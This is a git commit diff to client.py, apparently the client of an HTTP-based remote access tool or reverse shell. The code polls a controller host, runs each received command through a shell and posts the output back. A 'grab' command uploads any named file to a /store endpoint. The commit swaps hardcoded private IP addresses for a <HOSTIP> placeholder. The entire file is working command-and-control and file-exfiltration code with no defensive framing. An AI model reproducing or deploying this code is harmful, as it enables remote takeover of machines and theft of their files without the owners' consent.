191d93363be05dbee2074b8cc9eb2c2bb4cbbd5f
Andy Morales <39770126+andy2002a@users.noreply.github.com>
2020-11-04 08:27:43 -0500

    Update client.py

--- client.py
+++ client.py
@@ -7,7 +7,7 @@ import os
 
 while True: 
 
-    req = requests.get('http://10.10.10.100')      # Send GET request to host machine
+    req = requests.get('http://<HOSTIP>')      # Send GET request to host machine
     command = req.text                             # Store the received txt into command variable
 
     if 'terminate' in command:
@@ -17,16 +17,14 @@ while True:
         grab,path=command.split('*')
 
         if os.path.exists(path):
-            url='http://192.168.158.128/store'   #Append /store in the URL
+            url='http://192.168.197.44/store'   #Append /store in the URL #not sure what this does
             files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
             r=requests.post(url, files=files) # Send the file
             #requests library use POST method called "multipart/form-data"
         else:
-            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
+            post_response = requests.post(url='http://<HOSTIP>', data='[-] Not able to find the file !' )
     else:
         CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
-        post_response = requests.post(url='http://192.168.158.128', data=CMD.stdout.read() ) 
-        post_response = requests.post(url='http://192.168.158.128', data=CMD.stderr.read() )  
+        post_response = requests.post(url='http://<HOSTIP>', data=CMD.stdout.read() ) 
+        post_response = requests.post(url='http://<HOSTIP>', data=CMD.stderr.read() )  
     time.sleep(3)
-
-    
